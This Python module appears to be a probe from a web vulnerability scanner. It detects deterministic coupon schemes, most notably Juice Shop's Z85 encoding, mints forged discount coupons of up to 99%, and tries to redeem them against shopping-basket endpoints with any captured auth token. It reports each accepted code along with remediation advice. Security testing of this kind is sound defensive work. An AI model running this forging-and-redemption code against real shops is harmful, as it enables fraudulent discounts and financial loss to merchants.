"""Forged-coupon probe.

Coupon-by-deterministic-encoding is a recurring class of business-logic
bug: the server redeems any coupon whose locally-computable encoding
parses, without checking an issued-codes table. Juice Shop's Z85 scheme
is the canonical example, but the same shape shows up with base64,
ROT13, and short MD5/SHA prefix variants in the wild.

The probe is multi-step:

1. Fingerprint the scheme. GET /rest/admin/application-configuration
   (or sibling config endpoints) and look at the response body for an
   explicit scheme hint (z85, base64, md5, sha256, rot13). When the
   target advertises no scheme we skip cleanly rather than blast Z85.

2. Mint forged coupons locally for the detected scheme.

3. Attempt redemption. PUT /rest/basket/{id}/coupon/<code> is the
   Juice-Shop shape; POST is the defensive fallback. Auth header
   forwarded when ctx.captured_auth is set.

Any 200 response that echoes a non-zero `discount`, an `applied: true`
flag, or persists the coupon counts as exploitation.
"""
from __future__ import annotations

import base64
import codecs
import datetime as _dt
import hashlib
import json
from typing import Any

from engine.probes import ProbeContext, registry
from engine.probes.primitives import http_get, http_post_json, http_put_json

# RFC 32 / ZeroMQ Z85 alphabet. Order matters; the index IS the digit value.
Z85_CHARS = (
    b"0123456789"
    b"abcdefghijklmnopqrstuvwxyz"
    b"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    b".-:+=^!/*?&<>()[]{}@%$#"
)


def z85_encode(data: bytes) -> str:
    """Encode bytes to a Z85 ASCII string.

    Pads with NUL bytes to a 4-byte boundary first so the encoder always
    consumes whole 32-bit words. Each word becomes five base-85 digits
    drawn from `Z85_CHARS`. Pure stdlib; no zmq dependency.
    """
    if len(data) % 4 != 0:
        data = data + b"\x00" * (4 - len(data) % 4)
    out: list[str] = []
    for i in range(0, len(data), 4):
        n = int.from_bytes(data[i : i + 4], "big")
        chunk = bytearray(5)
        for j in range(5):
            chunk[4 - j] = Z85_CHARS[n % 85]
            n //= 85
        out.append(chunk.decode("ascii"))
    return "".join(out)


def _juice_shop_coupon(percent: int, date: _dt.date) -> str:
    """Reproduce Juice Shop's `insecurity.generateCoupon` exactly.

    JS source: `z85.encode(Buffer.from(`${percent}${date}`).toString('base64').slice(0,25))`.
    The slice picks the first 25 base64 characters, which is 25 bytes of
    ASCII. That length encodes to floor(25/4)*5 = 30 + a partial chunk;
    we mirror it byte-for-byte.
    """
    cipher = f"{percent}{date.isoformat()}"
    b64 = base64.b64encode(cipher.encode("ascii")).decode("ascii")[:25]
    return z85_encode(b64.encode("ascii"))


def _base64_coupon(percent: int, date: _dt.date) -> str:
    """Trivial base64 scheme: encode `<percent><yyyy-mm-dd>` directly."""
    raw = f"{percent}{date.isoformat()}".encode("ascii")
    return base64.b64encode(raw).decode("ascii").rstrip("=")


def _rot13_coupon(percent: int, date: _dt.date) -> str:
    """ROT13 scheme: ROT13 of `<percent>-<yyyy-mm-dd>`."""
    raw = f"{percent}-{date.isoformat()}"
    return codecs.encode(raw, "rot_13")


def _md5_coupon(percent: int, date: _dt.date) -> str:
    """Short MD5 prefix of `<percent><yyyy-mm-dd>`. Common in toy CTFs."""
    raw = f"{percent}{date.isoformat()}".encode("ascii")
    return hashlib.md5(raw, usedforsecurity=False).hexdigest()[:16]


def _sha256_coupon(percent: int, date: _dt.date) -> str:
    """Short SHA-256 prefix variant."""
    raw = f"{percent}{date.isoformat()}".encode("ascii")
    return hashlib.sha256(raw).hexdigest()[:16]


# Encoder registry: scheme name -> (encoder_fn, label_prefix).
SCHEME_ENCODERS: dict[str, Any] = {
    "z85": _juice_shop_coupon,
    "base64": _base64_coupon,
    "rot13": _rot13_coupon,
    "md5": _md5_coupon,
    "sha256": _sha256_coupon,
}


def _detect_coupon_schemes(body: str) -> tuple[str, ...]:
    """Return the schemes hinted at by the config response, in priority order.

    Empty tuple means we should NOT fire the probe: blasting Z85 at
    arbitrary targets would be noise. Only fire when the target body
    advertises something coupon-shaped or fingerprints as Juice Shop.
    """
    if not body:
        return ()
    lowered = body.lower()
    schemes: list[str] = []

    # Direct algorithm hints in the config body.
    for key in ("z85", "base64", "rot13", "md5", "sha256"):
        if key in lowered and key not in schemes:
            schemes.append(key)

    # Juice Shop fingerprint: even without an explicit "z85" hint the
    # default coupon scheme is Z85, so add it as a fallback.
    looks_like_juice_shop = (
        "juice shop" in lowered
        or "juice-sh.op" in lowered
        or ("couponcode" in lowered and '"application"' in lowered)
    )
    if looks_like_juice_shop and "z85" not in schemes:
        schemes.append("z85")

    return tuple(schemes)


def _candidate_coupons(schemes: tuple[str, ...]) -> list[tuple[str, int, str]]:
    """Forged candidates across schemes and date offsets: (code, pct, label)."""
    today = _dt.date.today()
    yesterday = today - _dt.timedelta(days=1)
    last_week = today - _dt.timedelta(days=7)
    plan = [
        (80, today, "80%-today"),
        (50, today, "50%-today"),
        (99, today, "99%-today"),
        (80, yesterday, "80%-yesterday"),
        (50, last_week, "50%-last-week"),
    ]
    out: list[tuple[str, int, str]] = []
    for scheme in schemes:
        encoder = SCHEME_ENCODERS.get(scheme)
        if encoder is None:
            continue
        for pct, d, label in plan:
            code = encoder(pct, d)
            out.append((code, pct, f"{scheme}:{label}"))
    return out


CONFIG_PATH = "/rest/admin/application-configuration"
ALT_CONFIG_PATHS: tuple[str, ...] = (
    "/api/config",
    "/api/configuration",
    "/api/v1/config",
)
DEFAULT_BASKET_IDS: tuple[int, ...] = (1, 2, 3)


async def _fetch_config_body(ctx: ProbeContext) -> str:
    """GET each known config path; return the first 200 body, else empty."""
    for path in (CONFIG_PATH, *ALT_CONFIG_PATHS):
        try:
            status, _, body = await http_get(ctx.session, ctx.base + path)
        except Exception:  # noqa: BLE001
            continue
        if status == 200 and body:
            return body
    return ""


def _parse_json(body: str) -> Any:
    try:
        return json.loads(body)
    except (ValueError, TypeError):
        return None


def _redemption_succeeded(status: int, body: str) -> tuple[bool, str]:
    """Decide whether a redemption response indicates the forged coupon was accepted.

    Returns `(hit, evidence_snippet)`. Pulled out so we can share it
    across PUT (Juice Shop's actual shape) and POST (defensive fallback).
    """
    if status != 200:
        return False, ""
    parsed = _parse_json(body)
    if isinstance(parsed, dict):
        # Juice Shop wraps payload in {"status": "...", "data": {...}}.
        data = parsed.get("data") if isinstance(parsed.get("data"), dict) else parsed
        if isinstance(data, dict):
            discount = data.get("discount")
            if isinstance(discount, (int, float)) and discount > 0:
                return True, f"discount={discount}"
            if data.get("applied") is True:
                return True, "applied=true"
            if data.get("couponCode"):
                return True, f"couponCode={data['couponCode']!r}"
        if "successfully redeemed" in body.lower():
            return True, "successfully redeemed"
    elif "successfully redeemed" in body.lower():
        return True, "successfully redeemed"
    return False, ""


def _emit(target: str, code: str, label: str, evidence: str) -> dict[str, Any]:
    return {
        "title": f"Forged Z85 coupon accepted ({label}): {code}",
        "severity": "high",
        "category": "business_logic",
        "target": target,
        "evidence": (
            f"Locally-generated coupon {code!r} ({label}) accepted; "
            f"server response: {evidence}."
        ),
        "bug_class": "business_logic",
        "remediation": (
            "Stop deriving coupon validity from a deterministic local "
            "encoding. Issue coupon codes from a server-side store with "
            "per-code expiry and single-use tracking, and verify each "
            "presented code against that store before applying a discount."
        ),
    }


def _auth_headers(ctx: ProbeContext) -> dict[str, str]:
    """Pull Authorization out of `captured_auth` when a prior probe set it."""
    auth = ctx.captured_auth or {}
    token = auth.get("token") or auth.get("authorization")
    if not token:
        return {}
    if isinstance(token, str) and not token.lower().startswith("bearer "):
        token = f"Bearer {token}"
    return {"Authorization": token}


@registry.probe(
    name="web.coupon_forging",
    bug_class="business_logic",
    severity_max="high",
    owasp="A04:2021",
    runtime_budget_s=10.0,
    tags=("anonymous", "high-roi", "financial", "destructive-low"),
    requires_auth=False,
)
async def probe_coupon_forging(ctx: ProbeContext) -> list[dict[str, Any]]:
    """Discover the coupon scheme, mint forged codes, attempt redemption."""
    base = ctx.base
    findings: list[dict[str, Any]] = []

    # Step 1: scheme discovery. We explicitly try the canonical Juice
    # Shop config path first because the existing test mocks a single
    # session.get response and we want that to land. If it 404s we fall
    # through to alternate config paths.
    cfg_status, _, cfg_body = await http_get(ctx.session, base + CONFIG_PATH)
    if cfg_status != 200 or not cfg_body:
        cfg_body = await _fetch_config_body(ctx)
    schemes = _detect_coupon_schemes(cfg_body)
    if not schemes:
        return findings

    # Step 2: locally mint forged coupons for each detected scheme.
    candidates = _candidate_coupons(schemes)
    headers = _auth_headers(ctx)

    # Step 3: attempt redemption against likely basket ids.
    seen: set[str] = set()
    for basket_id in DEFAULT_BASKET_IDS:
        for code, _pct, label in candidates:
            if code in seen:
                continue
            put_url = f"{base}/rest/basket/{basket_id}/coupon/{code}"
            put_status, _, put_body = await http_put_json(
                ctx.session, put_url, {}, headers=headers or None
            )
            hit, evidence = _redemption_succeeded(put_status, put_body)
            if hit:
                seen.add(code)
                findings.append(_emit(put_url, code, label, evidence))
                continue

            post_url = f"{base}/rest/basket/{basket_id}/coupon"
            post_status, _, post_body = await http_post_json(
                ctx.session, post_url, {"coupon": code}, headers=headers or None
            )
            hit2, evidence2 = _redemption_succeeded(post_status, post_body)
            if hit2:
                seen.add(code)
                findings.append(_emit(post_url, code, label, evidence2))

    return findings
